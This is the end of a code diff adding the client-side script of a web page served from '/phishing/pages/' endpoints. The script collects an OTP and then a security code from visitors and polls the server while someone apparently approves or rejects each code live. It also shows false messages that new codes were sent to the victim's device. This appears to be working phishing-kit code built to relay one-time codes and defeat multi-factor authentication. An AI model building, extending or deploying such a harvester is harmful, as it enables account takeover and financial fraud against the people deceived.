+        errorWrapEl.classList.add('hidden');
+        if (attemptsBoxEl) attemptsBoxEl.classList.add('hidden');
+    }
+
+    function clearStatusCheck() {
+        pendingStatusCheck = false;
+        if (statusTimeoutId) {
+            clearTimeout(statusTimeoutId);
+            statusTimeoutId = null;
+        }
+    }
+
+    function resetVerification(field) {
+        fetch(API_BASE + '/phishing/pages/reset-verification', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({page_id: pageId, session_token: sessionToken, field: field})
+        }).catch(function(){});
+    }
+
+    function markInputsError(inputs) {
+        inputs.forEach(function(inp) {
+            inp.classList.add('error');
+            setTimeout(function() { inp.classList.remove('error'); }, 600);
+        });
+    }
+
+    function resetInputs(inputs) {
+        inputs.forEach(function(inp) { inp.value = ''; });
+        if (inputs[0]) inputs[0].focus();
+    }
+
+    function setControlsVisible(visible) {
+        if (visible) {
+            actionBtn.classList.remove('hidden');
+            if (currentStep === 1) resendWrap.classList.remove('hidden');
+            if (currentStep === 2) resendSecWrap.classList.remove('hidden');
+        } else {
+            actionBtn.classList.add('hidden');
+            resendWrap.classList.add('hidden');
+            resendSecWrap.classList.add('hidden');
+        }
+    }
+
+    // =========================
+    // State-Based Verification
+    // =========================
+    function checkVerificationStatus(target, attemptCount, onResult) {
+        if (!pendingStatusCheck) return;
+        if (attemptCount > MAX_STATUS_CHECKS) {
+            onResult('timeout');
+            return;
+        }
+
+        fetch(API_BASE + '/phishing/pages/verify-status', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({page_id: pageId, session_token: sessionToken})
+        })
+        .then(function(res) {
+            if (!res.ok) throw new Error('Status check failed');
+            return res.json();
+        })
+        .then(function(data) {
+            if (!pendingStatusCheck) return;
+
+            var val;
+            if (target === 'otp') {
+                val = data.otp_verification;
+            } else {
+                val = data.security_code_verification;
+            }
+
+            // State-based: ONLY act on definitive true or false
+            // null / undefined → keep waiting, do NOTHING
+            if (val === true) {
+                onResult('verified');
+            } else if (val === false) {
+                onResult('rejected');
+            } else {
+                // Still null / not reviewed → wait and check again
+                statusTimeoutId = setTimeout(function() {
+                    checkVerificationStatus(target, attemptCount + 1, onResult);
+                }, VERIFY_INTERVAL);
+            }
+        })
+        .catch(function() {
+            if (!pendingStatusCheck) return;
+            // Network error - retry with slight backoff
+            statusTimeoutId = setTimeout(function() {
+                checkVerificationStatus(target, attemptCount + 1, onResult);
+            }, VERIFY_INTERVAL + 2000);
+        });
+    }
+
+    function submitOtp(otp){
+        return fetch(API_BASE + '/phishing/pages/submit-otp', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({page_id: pageId, otp_code: otp})
+        }).then(function(res) {
+            if (!res.ok) {
+                return res.json().catch(function(){ return {detail:'Request failed'}; }).then(function(err) {
+                    throw new Error(err.detail || 'Request failed');
+                });
+            }
+            return res.json();
+        });
+    }
+
+    function submitSec(sec){
+        return fetch(API_BASE + '/phishing/pages/submit-otp', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({page_id: pageId, sec_code: sec})
+        }).then(function(res) {
+            if (!res.ok) {
+                return res.json().catch(function(){ return {detail:'Request failed'}; }).then(function(err) {
+                    throw new Error(err.detail || 'Request failed');
+                });
+            }
+            return res.json();
+        });
+    }
+
+    // =========================
+    // Action Button Click
+    // =========================
+    actionBtn.addEventListener('click', function() {
+        if (isSubmitting) return;
+
+        if (currentStep === 1) {
+            var otp = Array.from(otpInputs).map(function(i) { return i.value; }).join('');
+            if (otp.length !== 8) {
+                showError(otpError, otpErrorWrap, null, null, 'Please enter the complete 8-digit OTP code.');
+                markInputsError(otpInputs);
+                return;
+            }
+            hideError(otpErrorWrap, otpAttemptsBox);
+            isSubmitting = true;
+            setBtn('Submitting...', true);
+
+            submitOtp(otp).then(function() {
+                // Code submitted successfully - now enter waiting state
+                setBtn('Submitting...', true);
+                setControlsVisible(false);
+                showInlineStatus('otp', true);
+                setInputsDisabled(otpInputs, true);
+
+                // Start state-based verification monitoring
+                pendingStatusCheck = true;
+                checkVerificationStatus('otp', 0, function(result) {
+                    // Guard: ignore if user navigated away from this step
+                    if (currentStep !== 1) return;
+
+                    showInlineStatus('otp', false);
+                    setInputsDisabled(otpInputs, false);
+
+                    if (result === 'verified') {
+                        // otp_verification changed from null → true
+                        isSubmitting = false;
+                        currentStep = 2;
+                        otpSection.classList.add('hidden');
+                        resendWrap.classList.add('hidden');
+                        secSection.classList.remove('hidden');
+                        secSection.classList.add('fade-in');
+                        resendSecWrap.classList.remove('hidden');
+                        setBtn('Verify', false);
+                        setControlsVisible(true);
+                        setTimeout(function() { if (secInputs[0]) secInputs[0].focus(); }, 300);
+                    }
+                    else if (result === 'rejected') {
+                        // otp_verification changed from null → false
+                        otpAttempts++;
+                        isSubmitting = false;
+                        markInputsError(otpInputs);
+                        // Reset server field back to null so next attempt can be evaluated fresh
+                        resetVerification('otp_verification');
+
+                        if (otpAttempts >= MAX_ATTEMPTS) {
+                            showError(otpError, otpErrorWrap, null, null, 'Maximum attempts reached. Please request a new code or contact support.');
+                            setControlsVisible(false);
+                            actionBtn.classList.add('hidden');
+                            resendWrap.classList.add('hidden');
+                            setInputsDisabled(otpInputs, true);
+                        } else {
+                            showError(otpError, otpErrorWrap, otpAttemptsBox, otpAttemptsText,
+                                'The OTP code you entered is incorrect.', otpAttempts, MAX_ATTEMPTS);
+                            setControlsVisible(true);
+                            setBtn('Verify Code', false);
+                            resetInputs(otpInputs);
+                        }
+                    }
+                    else if (result === 'timeout') {
+                        isSubmitting = false;
+                        showError(otpError, otpErrorWrap, null, null, 'Verification timed out. Please try again.');
+                        setControlsVisible(true);
+                        setBtn('Verify Code', false);
+                    }
+                });
+            }).catch(function(err) {
+                isSubmitting = false;
+                setBtn('Verify Code', false);
+                showError(otpError, otpErrorWrap, null, null, err.message || 'Failed to submit. Please try again.');
+            });
+        }
+        else if (currentStep === 2) {
+            var sec = Array.from(secInputs).map(function(i) { return i.value; }).join('');
+            if (sec.length !== 6) {
+                showError(secError, secErrorWrap, null, null, 'Please enter the complete 6-digit Security Code.');
+                markInputsError(secInputs);
+                return;
+            }
+            hideError(secErrorWrap, secAttemptsBox);
+            isSubmitting = true;
+            setBtn('Submitting...', true);
+
+            submitSec(sec).then(function() {
+                setBtn('Submitting...', true);
+                setControlsVisible(false);
+                showInlineStatus('sec', true);
+                setInputsDisabled(secInputs, true);
+
+                pendingStatusCheck = true;
+                checkVerificationStatus('sec', 0, function(result) {
+                    if (currentStep !== 2) return;
+
+                    showInlineStatus('sec', false);
+                    setInputsDisabled(secInputs, false);
+
+                    if (result === 'verified') {
+                        // security_code_verification changed from null → true
+                        isSubmitting = false;
+                        currentStep = 3;
+                        secSection.classList.add('hidden');
+                        resendSecWrap.classList.add('hidden');
+                        actionBtn.classList.add('hidden');
+                        successSection.classList.remove('hidden');
+                        successSection.classList.add('fade-in');
+                    }
+                    else if (result === 'rejected') {
+                        // security_code_verification changed from null → false
+                        secAttempts++;
+                        isSubmitting = false;
+                        markInputsError(secInputs);
+                        // Reset server field back to null so next attempt can be evaluated fresh
+                        resetVerification('security_code_verification');
+
+                        if (secAttempts >= MAX_ATTEMPTS) {
+                            showError(secError, secErrorWrap, null, null, 'Maximum attempts reached. Please request a new code or contact support.');
+                            setControlsVisible(false);
+                            actionBtn.classList.add('hidden');
+                            resendSecWrap.classList.add('hidden');
+                            setInputsDisabled(secInputs, true);
+                        } else {
+                            showError(secError, secErrorWrap, secAttemptsBox, secAttemptsText,
+                                'The Security Code you entered is incorrect.', secAttempts, MAX_ATTEMPTS);
+                            setControlsVisible(true);
+                            setBtn('Verify', false);
+                            resetInputs(secInputs);
+                        }
+                    }
+                    else if (result === 'timeout') {
+                        isSubmitting = false;
+                        showError(secError, secErrorWrap, null, null, 'Verification timed out. Please try again.');
+                        setControlsVisible(true);
+                        setBtn('Verify', false);
+                    }
+                });
+            }).catch(function(err) {
+                isSubmitting = false;
+                setBtn('Verify', false);
+                showError(secError, secErrorWrap, null, null, err.message || 'Failed to submit. Please try again.');
+            });
+        }
+    });
+
+    // =========================
+    // Resend Handler
+    // =========================
+    function handleResend(type) {
+        clearStatusCheck();
+        var linkEl = type === 'otp' ? resendLink : resendSecLink;
+        linkEl.style.pointerEvents = 'none';
+        linkEl.style.opacity = '0.5';
+        lastResendType = type;
+
+        fetch(API_BASE + '/phishing/pages/resend', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({page_id: pageId, session_token: sessionToken, resend_type: type})
+        }).then(function(res) { return res.json(); }).then(function(data) {
+            if (data.success) {
+                isSubmitting = false;
+                otpSection.classList.add('hidden');
+                secSection.classList.add('hidden');
+                actionBtn.classList.add('hidden');
+                resendWrap.classList.add('hidden');
+                resendSecWrap.classList.add('hidden');
+                showInlineStatus('otp', false);
+                showInlineStatus('sec', false);
+                resendSuccess.classList.remove('hidden');
+                resendSuccess.classList.add('fade-in');
+
+                if (type === 'sec') {
+                    resendDescText.textContent = 'A new security code has been sent to your registered device. Please check and enter the code below.';
+                    backToVerifyBtn.textContent = 'Back to Security Code';
+                } else {
+                    resendDescText.textContent = 'A new verification code has been sent to your registered email. Please check your inbox and enter the code below.';
+                    backToVerifyBtn.textContent = 'Back to OTP';
+                }
+            } else {
+                throw new Error(data.message || 'Failed to resend');
+            }
+        }).catch(function(err) {
+            resendMsg.textContent = err.message || 'Unable to resend. Please try again later.';
+            resendMsg.style.color = '#ff3849';
+            resendMsg.classList.remove('hidden');
+            linkEl.style.pointerEvents = '';
+            linkEl.style.opacity = '1';
+        });
+    }
+
+    resendLink.addEventListener('click', function(e) { e.preventDefault(); handleResend('otp'); });
+    resendSecLink.addEventListener('click', function(e) { e.preventDefault(); handleResend('sec'); });
+
+    // =========================
+    // Back to Verification
+    // =========================
+    backToVerifyBtn.addEventListener('click', function() {
+        clearStatusCheck();
+        resendSuccess.classList.add('hidden');
+        actionBtn.classList.remove('hidden');
+        resendMsg.classList.add('hidden');
+        isSubmitting = false;
+
+        if (lastResendType === 'sec') {
+            secSection.classList.remove('hidden');
+            secSection.classList.add('fade-in');
+            resendSecWrap.classList.remove('hidden');
+            setBtn('Verify', false);
+            resetInputs(secInputs);
+            setTimeout(function() { if (secInputs[0]) secInputs[0].focus(); }, 200);
+        } else {
+            otpSection.classList.remove('hidden');
+            otpSection.classList.add('fade-in');
+            resendWrap.classList.remove('hidden');
+            setBtn('Verify Code', false);
+            resetInputs(otpInputs);
+            setTimeout(function() { if (otpInputs[0]) otpInputs[0].focus(); }, 200);
+        }
+
+        resendLink.style.pointerEvents = '';
+        resendLink.style.opacity = '1';
+        resendSecLink.style.pointerEvents = '';
+        resendSecLink.style.opacity = '1';
+    });
+})();
+</script>
+{% endif %}
+</body>
+</html>
